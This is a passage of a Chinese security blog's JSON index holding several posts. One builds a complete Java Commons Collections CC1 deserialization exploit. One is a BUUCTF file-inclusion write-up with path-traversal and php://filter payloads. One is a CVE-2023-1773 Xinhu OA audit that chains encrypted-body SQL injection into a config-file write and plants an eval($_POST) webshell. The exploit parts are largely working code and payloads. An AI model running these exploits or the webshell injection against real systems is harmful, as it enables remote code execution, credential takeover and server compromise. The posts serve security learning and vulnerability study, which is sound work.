{ public static void main(String[] args){ IUser user = new UserImpl(); //动态代理 InvocationHandler userInvocationHandler = new UserInvocationHandler(user); IUser userProxy = (IUser) Proxy.newProxyInstance(user.getClass().getClassLoader(), user.getClass().getInterfaces(),userInvocationHandler); userProxy.show(); userProxy.create(); }} 上面已经知道了 newProxyInstanc()方法返回Object类型，因此要转型成IUser接口类型 在反序列化漏洞中的利用： Common Collections：CC112345678910111213141516171819/* Gadget chain: ObjectInputStream.readObject() AnnotationInvocationHandler.readObject() Map(Proxy).entrySet() AnnotationInvocationHandler.invoke() LazyMap.get() ChainedTransformer.transform() ConstantTransformer.transform() InvokerTransformer.transform() Method.invoke() Class.getMethod() InvokerTransformer.transform() Method.invoke() Runtime.getRuntime() InvokerTransformer.transform() Method.invoke() Runtime.exec() */ 环境Common Collections&lt;=3.2.1： 12345&lt;dependency&gt; &lt;groupId&gt;commons-collections&lt;/groupId&gt; &lt;artifactId&gt;commons-collections&lt;/artifactId&gt; &lt;version&gt;3.2.1&lt;/version&gt;&lt;/dependency&gt; 利用过程： Transform接口： Transform接口提供了一个transform()方法，传入一个对象对对象进行操作之后输出： 查看实现类（ctrl+h）： 重要的实现类有ConstantTransformer、invokerTransformer、ChainedTransformer、TransformedMap ConstantTransformer类： 其中的transform()方法不管输入什么都返回一个常量类iConstant，iConstant在构造器中获得 InvokerTransformer类： 构造方法传入可控的方法名(methodName)，方法参数的类型(paramTypes)，调用的参数(iArgs) tranform()方法传入一个对象，获取这个对象的Class原型。。一整条下来是一个非常非常完美的反射链调用方法的过程 这样即可触发计算器 1234567891011package com.example.commoncollections;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.InvokerTransformer;public class CC1 { public static void main(String[] args) throws Exception{ Runtime runtime = Runtime.getRuntime(); new InvokerTransformer(&quot;exec&quot;,new Class[]{String.class},new String[]{&quot;calc&quot;}).transform(runtime); }} 这里为 InvokerTransformer 类中的 transform()方法传入Runtime实例，同时通过构造方法传入了exec方法以及需要的参数类型(String.class)和参数值(calc)，我们之前提到了 transform 方法中的反射调用，所以成功弹出计算器。 ChainedTransformer类： ChainedTransformer类实现了Transformer链式调用，我们只需要传入一个Transformer数组ChainedTransformer就可以实现依次的去调用每一个Transformer的transform方法，并且将上一个transform方法返回的类传递给下一个进行调用，形成(N….transform(C.transform(B.transform(A.transform(Object)))))这样的一条链，数组的下一个元素对象执行数组的上一个元素对象的方法。 到这里为止可以构造一条链了： 1234567891011121314151617181920212223242526272829303132333435363738package com.example.commoncollections;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.AbstractMapDecorator;import org.apache.commons.collections.map.TransformedMap;import java.lang.reflect.Method;public class CC1 { public static void main(String[] args) throws Exception{ String cmd = &quot;calc.exe&quot;; Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]{ String.class, Class[].class}, new Object[]{ &quot;getRuntime&quot;, new Class[]{}}//获取到了getRuntime方法 ), new InvokerTransformer(&quot;invoke&quot;, new Class[]{ Object.class, Object[].class}, new Object[]{ null, new Object[]{}}//用invoke方法传递参数，等于调用了getRuntime()方法，获取了一个Runtime对象，用于传入下一步 ), new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{cmd}) }; // 创建ChainedTransformer调⽤链对象 Transformer transformedChain = new ChainedTransformer(transformers); // 执⾏对象转换操作 transformedChain.transform(null); }} 接下来就是看谁调用了InvokerTransformer类中的transformer()方法了，在寻找过程中如果发现a()方法调用了transformer()方法，就去找谁调用了a()方法，直到找到readObject() TransformedMap类： 其checkSetValue()方法调用了transform()方法，跟进valueTransformer 构造方法中给valueTransform赋值， 但是构造方法为protected，在类里找，发现decorate()方法调用了构造器，可用于调用g构造函数 继续寻找谁调用了checkSetValue()方法： 在TransformedMap类的父类 AbstractInputCheckedMapDecorator下定义了类EntryMap类 123456789101112131415static class MapEntry extends AbstractMapEntryDecorator { /** The parent map */ private final AbstractInputCheckedMapDecorator parent; protected MapEntry(Map.Entry entry, AbstractInputCheckedMapDecorator parent) { super(entry); this.parent = parent; } public Object setValue(Object value) { value = parent.checkSetValue(value); return entry.setValue(value); }} 其中setValue()方法下调用了checkSetValue()方法，而这里的setValue()方法与Map.Entry下的相同 只需要传入的参数合适便能达到预期目的，关于Java中的Entry类： https://www.cnblogs.com/2839888494xw/p/15042850.html 通过Map.entrySet()方法，获取到键值对，然后循环遍历，对每个键值对执行setValue()方法，便等同于执行了MapEntry下的setValue()方法，进而调用checkSetValue()方法，因为checkSetValue()只修改valueTransformer的值，所以decorate的时候只需要在键值的位置传入需要调用transform()方法的类 测试一下： 12345678910111213141516171819202122232425262728293031323334353637383940414243package com.example.commoncollections;import com.fasterxml.jackson.databind.ser.impl.MapEntrySerializer;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.AbstractMapDecorator;import org.apache.commons.collections.map.TransformedMap;import java.lang.reflect.Method;import java.util.HashMap;import java.util.Map;public class CC1 { public static void main(String[] args) throws Exception{ String cmd = &quot;calc.exe&quot;; Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]{ String.class, Class[].class}, new Object[]{ &quot;getRuntime&quot;, new Class[]{}}//获取到了getRuntime方法 ), new InvokerTransformer(&quot;invoke&quot;, new Class[]{ Object.class, Object[].class}, new Object[]{ null, new Object[]{}}//用invoke方法传递参数，等于调用了getRuntime()方法，获取了一个Runtime对象，用于传入下一步 ), new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{cmd}) }; // 创建ChainedTransformer调⽤链对象 Transformer transformedChain = new ChainedTransformer(transformers); // 执⾏对象转换操作// transformedChain.transform(null); Map&lt;Object,Object&gt; map = new HashMap&lt;&gt;(); map.put(&quot;potato&quot;,&quot;CC&quot;); Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,null,transformedChain); for (Map.Entry entry:transformedMap.entrySet()){ entry.setValue(&quot;any&quot;); } }} 合理猜想对transformedMap调用put()方法时会调用setValue()方法，毕竟增加了键值对必然要set， 12Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,null,transformedChain);transformedMap.put(&quot;h&quot;,&quot;gg&quot;); 发现也可以调用 下一步就要找谁的readObject()调用了setValue()方法： AnnotationInvocationHandler类： 在这之前先手动导入一下sun包， 先安装jdk源码： 在自己的jdk目录下将src压缩包解压 sun包copy到jdk的src目录下： 添加库： 查找setValue()用法时便能看到被AnnotationInvocationHandler的readObject()方法调用了，同时注意到该类不是public，只能在当前包下访问： 既然不是public，那就可以使用强大的反射来调用 最终exp： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465package com.example.commoncollections;import com.fasterxml.jackson.databind.ser.impl.MapEntrySerializer;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.AbstractMapDecorator;import org.apache.commons.collections.map.TransformedMap;import java.io.FileInputStream;import java.io.FileOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.annotation.Target;import java.lang.reflect.Constructor;import java.lang.reflect.Method;import java.util.HashMap;import java.util.Map;public class CC1 { public static void main(String[] args) throws Exception{ String cmd = &quot;calc&quot;; Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]{ String.class, Class[].class}, new Object[]{ &quot;getRuntime&quot;, new Class[]{}}//获取到了getRuntime方法 ), new InvokerTransformer(&quot;invoke&quot;, new Class[]{ Object.class, Object[].class}, new Object[]{ null, new Object[]{}}//用invoke方法传递参数，等于调用了getRuntime()方法，获取了一个Runtime对象，用于传入下一步 ), new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{cmd}) }; // 创建ChainedTransformer调⽤链对象 Transformer transformedChain = new ChainedTransformer(transformers); // 执⾏对象转换操作// transformedChain.transform(null); Map&lt;Object,Object&gt; map = new HashMap&lt;&gt;(); map.put(&quot;value&quot;,&quot;CC&quot;); Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,null,transformedChain);// transformedMap.put(&quot;h&quot;,&quot;hh&quot;);// for (Map.Entry entry:transformedMap.entrySet()){// entry.setValue(&quot;any&quot;);// } Class cls = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); //创建构造器 Constructor constructor = cls.getDeclaredConstructor(Class.class, Map.class); constructor.setAccessible(true); Object obj = constructor.newInstance(Target.class,transformedMap); serialize(obj); unserialize(&quot;data.bin&quot;); } public static void serialize(Object o) throws Exception{ ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(&quot;data.bin&quot;)); outputStream.writeObject(o); } public static Object unserialize(String filename) throws Exception{ ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(filename)); Object obj = objectInputStream.readObject(); return obj; }} 为什么是在构造函数第一个参数传入Target.class呢？这里跳到AnnotationInvocationHandler的构造函数处，可以看到第一个参数是一个Class的泛型，继承了注解的Annotation类，下面的if判断要求第一个参数isAnnotation()必须返回true，即必须是一个注解的类，Target是注解，当然Override也是，继续往下看 会发现Target有一个value()方法，而Override没有 在测试的时候发现只有put的键为”value”时才能触发反序列化，那为什么put()的键需要是”value”呢？ 我们去看最后的readObject()的重写： 12345678910111213141516171819202122232425262728293031323334 private void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException { s.defaultReadObject(); // Check to make sure that types have not evolved incompatibly AnnotationType annotationType = null; try { annotationType = AnnotationType.getInstance(type); } catch(IllegalArgumentException e) { // Class is no longer an annotation type; time to punch out throw new java.io.InvalidObjectException(&quot;Non-annotation type in annotation serial stream&quot;); } Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes(); // If there are annotation members without values, that // situation is handled by the invoke method. for (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) { String name = memberValue.getKey(); Class&lt;?&gt; memberType = memberTypes.get(name); if (memberType != null) { // i.e. member still exists Object value = memberValue.getValue(); if (!(memberType.isInstance(value) || value instanceof ExceptionProxy)) { memberValue.setValue( new AnnotationTypeMismatchExceptionProxy( value.getClass() + &quot;[&quot; + value + &quot;]&quot;).setMember( annotationType.members().get(name))); } } } }} 显然要走到最后的setValue()需要经过一个if判断，要求memberType非空，memberType是要以name变量为参数调用get()方法获取，意味着name变量不能为空，那name变量是什么？继续往上看，name是从memberValue中获取键，memberValue是一个键值对，遍历于memberValues，memberValues是在构造函数中被赋值的，就是我们传入的Map对象，也就是transformedMap 因此put上去的map的键，最终是“value”，memberTypes去get()获取”value”这个成员，那memberTypes是什么呢？ 是调用了annotationType的memberTypes()方法，那annotationType是怎么定义的 把我们传入的注解作为参数了，瞅一眼实现类AnnotationType的构造函数： 1234567891011121314151617181920212223242526272829303132333435363738394041424344private AnnotationType(final Class&lt;? extends Annotation&gt; var1) { if (!var1.isAnnotation()) { throw new IllegalArgumentException(&quot;Not an annotation type&quot;); } else { Method[] var2 = (Method[])AccessController.doPrivileged(new PrivilegedAction&lt;Method[]&gt;() { public Method[] run() { return var1.getDeclaredMethods(); } }); this.memberTypes = new HashMap(var2.length + 1, 1.0F); this.memberDefaults = new HashMap(0); this.members = new HashMap(var2.length + 1, 1.0F); Method[] var3 = var2; int var4 = var2.length; for(int var5 = 0; var5 &lt; var4; ++var5) { Method var6 = var3[var5]; if (var6.getParameterTypes().length != 0) { throw new IllegalArgumentException(var6 + &quot; has params&quot;); } String var7 = var6.getName(); Class var8 = var6.getReturnType(); this.memberTypes.put(var7, invocationHandlerReturnType(var8)); this.members.put(var7, var6); Object var9 = var6.getDefaultValue(); if (var9 != null) { this.memberDefaults.put(var7, var9); } } if (var1 != Retention.class &amp;&amp; var1 != Inherited.class) { JavaLangAccess var10 = SharedSecrets.getJavaLangAccess(); Map var11 = AnnotationParser.parseSelectAnnotations(var10.getRawClassAnnotations(var1), var10.getConstantPool(var1), var1, new Class[]{Retention.class, Inherited.class}); Retention var12 = (Retention)var11.get(Retention.class); this.retention = var12 == null ? RetentionPolicy.CLASS : var12.value(); this.inherited = var11.containsKey(Inherited.class); } else { this.retention = RetentionPolicy.RUNTIME; this.inherited = false; } }} var3是注解类中成员方法的集合，（比如Target下的value()） CC2JavaDeserializeLabslab1-basiclab2-ysoseriallab3-shiro-jrmplab4-shiro-blindlab5-weblogic-readResolvelab6-weblogic-resolveProxyClasslab7-weblogic-UnicastReflab8-jrmp-unicastRemoteObjectlab9-proxy","link":"/2023/02/09/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"title":"文件包含","text":"BUUCTF_ WarmUp嗯。。一打开是一个滑稽脸直接一眼ctrl+u查看源代码，查找到注释提示source.php，进入source.php看到是php代码审计。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;?php highlight_file(__FILE__); class emmm { public static function checkFile(&amp;$page) { $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;]; if (! isset($page) || !is_string($page)) { echo &quot;you can't see it&quot;; return false; } if (in_array($page, $whitelist)) { return true; } $_page = mb_substr( $page, 0, mb_strpos($page . '?', '?') ); if (in_array($_page, $whitelist)) { return true; } $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . '?', '?') ); if (in_array($_page, $whitelist)) { return true; } echo &quot;you can't see it&quot;; return false; } } if (! empty($_REQUEST['file']) &amp;&amp; is_string($_REQUEST['file']) &amp;&amp; emmm::checkFile($_REQUEST['file']) ) { include $_REQUEST['file']; exit; } else { echo &quot;&lt;br&gt;&lt;img src=\\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\&quot; /&gt;&quot;; } ?&gt; 先看代码主体部分 123456789if (! empty($_REQUEST['file']) &amp;&amp; is_string($_REQUEST['file']) &amp;&amp; emmm::checkFile($_REQUEST['file']) ) { include $_REQUEST['file']; exit; } else { echo &quot;&lt;br&gt;&lt;img src=\\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\&quot; /&gt;&quot;; } 明确了传入一个参数file，并且如果满足： file不为空（被赋值）；是字符串；传入emmm类中的checkFile()方法后返回值为真。则能够将file包含。 审计emmm类， 1$whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;]; 白名单中包含”source.php”和”hint.php”，source.php就是本页面，传入file=hint.php对hint.php进行包含（一开始做的时候真的以为是什么提示硬是想不看提示自己琢磨结果发现无论如何还是得看的呜呜呜呜呜） 告诉了我们得到flag不是在这，而是在ffffllllaaaagggg，继续审计， 1234if (! isset($page) || !is_string($page)) { echo &quot;you can't see it&quot;; return false; } $page必须是有被赋值而且是字符串。 123if (in_array($page, $whitelist)) { return true; } $page如果在白名单内（source.php和hint.php）则返回true。 12345$_page = mb_substr( $page, 0, mb_strpos($page . '?', '?') ); mb_substr(a,b,c)，对a字符串进行截取，从第b位开始，截取c个字符串长度，返回截取的字符串； mb_strpos(a,b)，返回字符串b在字符串a中第一次出现的位置，如果没出现过则返回false； mb_substr()截取$page，从第一个字符开始，截取长度为mb_strpos($page.’?’,’?’)，即问号在字符串page$.’?’（就是$page字符串最后面跟一个问号）中第一次出现的位置，记住是第一次，$page.’?’末尾的问号未必是第一次出现的位置。截取到的字符串赋值给$_page。（注意分清变量名） 123if (in_array($_page, $whitelist)) { return true;} 如果$_page在白名单里，则返回true，$_page的值我们是可以决定的，所以传入的file的值应以字符串”hint.php?”或者”source.php?”开头，这样一来经过mb_sudstr()的截取最终将”hint.php”或”source.php”与白名单进行对比返回为true。 到此为止已经满足了主体部分的三个条件了，结合hint.php的提示flag在ffffllllaaaagggg，传参?file=hint.php?ffffllllaaaagggg，没有结果判断flag不在本目录，盲猜在根目录，于是 payload： ?file=hint.php?./../../../../../../../../ffffllllaaaagggg 或 ?file=source?./../../../../../../ffffllllaaaagggg BUUCTF_新生赛include1一开始只有一个tips超链接，点击，提示“Can you find out the flag?”。查看源代码没有任何收获，发现url的位置是通过file传参，file=flag.php。想到应该是主页源码含有文件包含，通过包含参数file。尝试php伪协议。 1?file=php://input 页面发出警告“hacker!”尝试大写绕过失败，尝试filter伪协议读取网页源码。 1php://filter/read=convert.base64-encode/resource=flag.php base64解码后拿到flag 题后反思：用同样的方法查看了一下index.php源码 过滤函数使用的是stristr()是不区分大小写的，strstr()则区分，同样还过滤掉了zip://和phar://还有data://。顺路学了下文件上传的zip://和phar://协议注入。","link":"/2023/02/09/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"},{"title":"无字母数字RCE","text":"","link":"/2023/04/09/%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97RCE/"},{"title":"记一次CMS代码审计","text":"CVE-2023-1773产品：信呼oa 影响版本：&lt;=2.32 开源地址：https://github.com/rainrocka/xinhu/commits/master/ 该博客为本人第一篇代码审计相关文章，本人才疏学浅，博客乃用于记录个人所学，因此许多地方会较为赘述，细节，这些都是个人的收获，如觉繁琐请见谅 根据官网说明先搭建好框架环境： 在分析漏洞点所在之前，我们需要对框架的功能有一个了解，什么参数是起到什么作用，哪些变量我们可以控制哪些不行，着重观察GET或者POST值处 index.php主程序入口在index.php，先对其进行审计 代码不多，包含了个config.php是存放框架的各种配置。留意$d,$m,$a三个变量。有个函数$rock-&gt;get()，get()方法是什么？ 跟进$rock，$rock = new rockClass();，那就看看get()在rockClass()类中是怎样定义的： 代码也不多 1234567891011public function get($name,$dev='', $lx=0){ $val=$dev; //$val初始化 if(isset($_GET[$name]))$val=$_GET[$name]; //从GET参数中获取值传给$val， if($this-&gt;isempt($val))$val=$dev; //判断$val是否为“空”，isempty()条件下述提到，若为空，则让$val重新为初始值 return $this-&gt;jmuncode($val, $lx, $name); //返回jmuncode()操作后的值，该函数用于对参数进行安全操作} isempt()方法，即若传入字符为空(各种意义的空)并且字符不为数字则返回true： 123456public function isempt($str){ $bool=false; if( ($str==''||$str==NULL||empty($str)) &amp;&amp; (!is_numeric($str)) )$bool=true; return $bool;} jmuncode()代码暂且不赘述。总结get()方法的作用就是获取GET传参中的值，并做了一定的xss过滤等处理，其中对单引号进行了转义，去除空格 View.php到这了，那么看看谁用了$d,$m,$a这仨变量，Find Usages，发现在View.php中调用了这三个变量 红色框为这三个变量赋初值(若未传入则为默认值) 重点在黄色框，如果$m中存在’|’字符，则将m变量以’|’为分割划分为两部分$m和$_m 下面引入了$rock中自定义的一个格式化字符串函数strformat()： 12345678910111213141516171819202122public function strformat($str){ $len = func_num_args(); //这里可以收获了func_num_args()获取传入函数的参数数量 $arr = array(); for($i=1; $i&lt;$len; $i++)$arr[] = func_get_arg($i); //func_get_arg()配合func_num_args()打组合拳自定义函数传入参数的数量 //为什么从i=1开始？因为格式化字符串函数传入的第一个参数是含占位符的待格式化字符串 $s = $this-&gt;stringformat($str, $arr); return $s;}............public function stringformat($str, $arr=array()){ $s = $str; for($i=0; $i&lt;count($arr); $i++){ $s=str_replace('?'.$i.'', $arr[$i], $s); //一个简单的replace，占位符为'?'加上一个数字代表用后面第几个参数来填充该位置 } return $s;} 例如这个：include_once($rock-&gt;strformat('?0/?1/?1Action.php',ROOT_PATH, $p));最终格式化后的字符串为：&quot;ROOT_PATH/&quot;.$p.&quot;/&quot;.$p.&quot;Action.php&quot;，看起来试图包含住一个以Action.php结尾的文件，正巧刚刚翻目录的时候看到了一堆一堆的Action结尾的文件。那么ROOT_PATH,$p，这俩又是什么东东呢？ 在config.php中对ROOT_PATH有定义： 1define('ROOT_PATH',str_replace('\\\\','/',dirname(dirname(__FILE__)))); //系统跟目录路径 $p变量向上跟进，为PROJECT，PROJECT再向上跟进，定义了它为’webmain’目录，此时p如果没有收到GET传参的p就会默认为’webmain’ 123$p = PROJECT;......if(!defined('PROJECT'))define('PROJECT', $rock-&gt;get('p', 'webmain')); 可以留意$ajaxbool变量，下面会用的$ajaxbool = $rock-&gt;get('ajaxbool', $ajaxbool);，总之不要放过任何一个调用get()方法的变量，都是可控的 控制文件被包含这里有个一路径中的变量$actpath，被两个下文被包含住的变量$actfile以及$actfile1给拼接，弄明白是如何构造的： 用ROOT_PATH，$p，$d，$_m分别填充前面的一个格式化路径 $_m我们可以控制GET传入m参数时’|’字符两边的字符串来控制，$p和ROOT_PATH，$d在上面存在一个简单的处理，如果不是以’/‘结尾就给他加上’/‘ 总结起来，假设我们的根目录是/var/www/html/，传入p=webmain&amp;d=task&amp;m=file|api 那么$actpath就是”/var/www/html/webmain/task/api” 紧接着下面的$actfile就是”/var/www/html/webmain/task/api/fileAction.php”， 也就是该文件被包含： 控制类和方法其实actfile1我们并不能做到真正完全的可控，因为其最后的拼接是$_m.$_m，就意味着最后包含的php文件的前缀名必须与上级目录相同，具有一定的局限性，这里我们侧重观察actfile被包含后的操作(实际上actfile1被包含后也确实并没有进行更多的操作了)，接下来的分析围绕着actfile，$classname变量由$a和”ClassAction”拼接起来，$a可控。，$actname变量由$a和”Action”拼接起来，$a可控。如果ajaxbool为true那么$actname由$a和”Ajax”拼接，$ajaxbool可控(前文提到控制GET传参)。然后new一个名为$classname的值的类，判断该对象中是否存在名为$actname的方法，如果存在，就执行并把结果echo出来 beforeAction()和afterAction()是父类Action类中的抽象方法 如果ajaxbool为false(默认)或者html，就进行模板渲染 至此，我们已经可以做到控制包含工作目录下的Action文件，并且控制执行其中的方法，接下来就是寻找一个Action文件中有可利用的类方法了 寻找可利用漏洞/webmain/system/cog/conAction.php下： cogClassAction::savecongAjax()方法中有一处文件写入，只要可以控制$adminnme就可以控制任意文件写入，在对oa系统本身功能的浏览后发现并不能直接在oa内部修改管理员的名字，思路就是寻找一个sql注入的点， 观察到其实有许多的action都存在sql注入的点，但是get()和post()方法获取参数时引入了黑名单检查直接将许多危险字符(串)过滤了。 注意到/webmain/task/api/reimplatAction.php下的indexAction()方法也存在sql注入点，但是该方法有点特殊： $body直接调用getpostdata()方法从请求体中获取数据，然后经过一次解密后得到$bodystr，对$bodystr再json解码后，获取其中键值对进行sql操作，思考：我们怎么样操作使得加密后的字符串可控呢？ 答：源代码就在自己手上直接调试就好了啊kora！把自己想构造的json发送出去，打印出加密后的字符串不就行了吗 追踪getpostdata()方法，可以看到是一点过滤都没有的。那我们就可以通过直接从请求体发送加密后的字符串从而避免经过get()和post()参数的过滤了！经过strunlook()方法解密后直接拼接到sql语句中 1234567public function getpostdata(){ $postdata = ''; if(isset($GLOBALS['HTTP_RAW_POST_DATA']))$postdata = $GLOBALS['HTTP_RAW_POST_DATA']; if($postdata=='')$postdata = trim(file_get_contents('php://input')); return $postdata;} 跟踪下解密方法： 1234567891011121314151617181920$bodystr = $this-&gt;jm-&gt;strunlook($body, $key);//reimplatAction.php-&gt; ...$this-&gt;jm = c('jm', true);//reimpaltAction.php，那c是啥？跟踪c()方法-&gt; ...function c($name, $inbo=true, $param1='', $param2=''){ $class = ''.$name.'Chajian'; $path = ''.ROOT_PATH.'/include/chajian/'.$class.'.php'; $cls = NULL; if(file_exists($path)){ include_once($path); if($inbo)$cls = new $class($param1, $param2); } return $cls; }//rockFun.php，分析代码后发现c()方法是包含/include/chajian/下对应参数名的插件php文件，此处对应追踪到jmChajian.php-&gt; ... 找到了strlook()和strunlook()方法 在本地调试时将加密后的字符串打印出来： 经测试没问题，那么我们就可以根据自己的需求，构造恶意json了 回到reimplatAction.php，分析可利用点： json有这几个键值对： 1{&quot;msgtype&quot;:&quot;&quot;,&quot;msgevent&quot;:&quot;&quot;,&quot;user&quot;:&quot;&quot;,&quot;mobile&quot;:&quot;&quot;,} 根据msgtype的构造值不同，可以进行不同的操作，至此，在不需要sql注入漏洞的情况下已经可以修改管理员密码了 发送加密后字符串： 使用新密码666直接登陆后台： 当然我们不止步于此，能sql注入的地方，为什么要放过他们呢？ 这里出现了多个m()方法，是什么？跟进去看下 分析一波可以知道是把/webmain/model/下的php文件包含起来了 123456789101112131415161718192021222324252627function m($name){ $cls = NULL; $pats = $nac = ''; $nas = $name; $asq = explode(':', $nas); if(count($asq)&gt;1){ $nas = $asq[1]; $nac = $asq[0]; $pats = $nac.'/'; $_pats = ''.ROOT_PATH.'/'.PROJECT.'/model/'.$nac.'/'.$nac.'.php'; if(file_exists($_pats)){ include_once($_pats); $class = ''.$nac.'Model'; $cls = new $class($nas); } } $class = ''.$nas.'ClassModel'; $path = ''.ROOT_PATH.'/'.PROJECT.'/model/'.$pats.''.$nas.'Model.php'; if(file_exists($path)){ include_once($path); if($nac!='')$class= $nac.'_'.$class; $cls = new $class($nas); } if($cls==NULL)$cls = new sModel($nas); return $cls;} 追踪到底层其实是调用/include/class/mysql.php里的数据库操作函数： getmou()获取table(此处table由m的构造函数传参决定，传入admin就对xinhu_admin表进行操作)中$where处的$fields的值 123456789101112131415161718public function getmou($table,$fields,$where,$order=''){ $sql = $this-&gt;getsql(array( 'table' =&gt; $table, 'where' =&gt; $where, 'fields'=&gt; $fields, 'order' =&gt; $order )); $res=$this-&gt;query($sql); if($res){ $row = $this-&gt;fetch_array($res, 1); if($row){ $this-&gt;count = 1; return $row[0]; } } return false;} update()更新table(同getmou()中指定方式相同)表中$where处$array的值，没有则新增 123456789101112131415161718192021public function record($table,$array,$where=''){ $addbool = true; if(!$this-&gt;isempt($where))$addbool=false; $cont = ''; if(is_array($array)){ foreach($array as $key=&gt;$val){ $cont.=&quot;,`$key`=&quot;.$this-&gt;toaddval($val).&quot;&quot;; } $cont = substr($cont,1); }else{ $cont = $array; } if($addbool){ $sql=&quot;insert into `$table` set $cont&quot;; }else{ $where = $this-&gt;getwhere($where); $sql=&quot;update `$table` set $cont where $where&quot;; } return $this-&gt;tranbegin($sql);} 至此我们回到上面的cogClassAction.php，我们可以通过sql注入更新管理员的名字，思考如何构造？ 要执行我们自己插入的rce代码，首先要脱离注释符，那就需要一个”\\n”，然后插入完想执行的的php代码后，再用注释符注释掉后面多余的代码。 eg： 1\\nphpinfo();// 然后写入webmain/webmainConfig.php： 此处会被修改 editmobile处比较好操作，editpass也可注入，构造恶意json 传入加密字符串： admin的名字已经发生变化了： 这时候需要重新登陆一下让session重置，$adminname才会重置： 这时候包含一下cogAction.php： 配置文件变成这样了： 后续测试中发现此处利用点似乎并无法导致getshell，当插入代码如下时： 重新登陆会提示，还是有比较大局限性的： 后记：\\neval($_POST[1]);//就不会太长了。还是可以getshell的，有了eval之后可执行的代码就大大拓宽了 蚁剑连接：","link":"/2023/12/23/%E8%AE%B0%E4%B8%80%E6%AC%A1CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}],"tags":[{"name":"Web","slug":"Web","link":"/tags/Web/"},{"name":"Misc","slug":"Misc","link":"/tags/Misc/"},{"name":"正则表达式","slug":"正则表达式","link":"/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"},{"name":"Tools","slug":"Tools","link":"/tags/Tools/"},{"name":"ssrf","slug":"ssrf","link":"/tags/ssrf/"},{"name":"反序列化","slug":"反序列化","link":"/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"cve","slug":"cve","link":"/tags/cve/"},{"name":"MySQL","slug":"MySQL","link":"/tags/MySQL/"},{"name":"rce","slug":"rce","link":"/tags/rce/"},{"name":"sqli","slug":"sqli","link":"/tags/sqli/"},{"name":"xss","slug":"xss","link":"/tags/xss/"},{"name":"Docker","slug":"Docker","link":"/tags/Docker/"},{"name":"Java","slug":"Java","link":"/tags/Java/"},{"name":"PHP","slug":"PHP","link":"/tags/PHP/"},{"name":"ssti","slug":"ssti","link":"/tags/ssti/"},{"name":"文件上传","slug":"文件上传","link":"/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"name":"文件包含","slug":"文件包含","link":"/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"}],"categories":[{"name":"做题记录","slug":"做题记录","link":"/categories/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"},{"name":"学习记录","slug":"学习记录","link":"/categories/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"},{"name":"自建靶场","slug":"学习记录/自建靶场","link":"/categories/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E8%87%AA%E5%BB%BA%E9%9D%B6%E5%9C%BA/"},{"name":"渗透工具","slug":"学习记录/渗透工具","link":"/categories/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/"},{"name":"常见漏洞","slug":"常见漏洞","link":"/categories/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/"},{"name":"Web漏洞","slug":"常见漏洞/Web漏洞","link":"/categories/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/Web%E6%BC%8F%E6%B4%9E/"},{"name":"Docker","slug":"学习记录/Docker","link":"/categories/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/Docker/"},{"name":"笔记","slug":"学习记录/笔记","link":"/categories/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E7%AC%94%E8%AE%B0/"}],"pages":[{"title":"categories","text":"","link":"/categories/index.html"},{"title":"tags","text":"","link":"/tags/inde